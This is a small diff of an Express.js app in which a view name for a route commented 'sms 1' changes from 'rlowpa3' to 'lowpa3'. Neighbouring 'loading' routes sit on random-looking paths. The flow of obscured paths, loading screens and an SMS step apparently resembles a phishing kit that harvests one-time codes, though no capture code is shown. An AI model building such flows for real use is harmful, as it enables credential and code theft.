@@ -127,7 +127,7 @@ app.get("/RKnUB922z6Mf4HDwg3EZ",(req,res)=>{ // loading 2:
     res.render("sktm-1");
 });
 app.get("/aEsKRvuaENZtYax265Kv",(req,res)=>{ // sms 1:
-    res.render("rlowpa3");
+    res.render("lowpa3");
 });
 app.get("/LGknmeM9HwWUWSutj6mJ",(req,res)=>{ // loading 3:
     res.render("sktm-2");
